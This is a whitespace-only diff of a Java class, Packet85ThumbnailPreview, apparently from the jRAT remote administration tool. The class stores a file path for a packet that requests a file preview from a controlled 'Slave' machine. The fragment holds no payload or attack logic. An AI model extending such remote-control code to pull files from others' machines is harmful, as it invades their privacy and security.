@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet85ThumbnailPreview extends AbstractOutgoingPacket {
 
 	private String file;
-	
+
 	public Packet85ThumbnailPreview(String file) {
 		this.file = file;
 	}
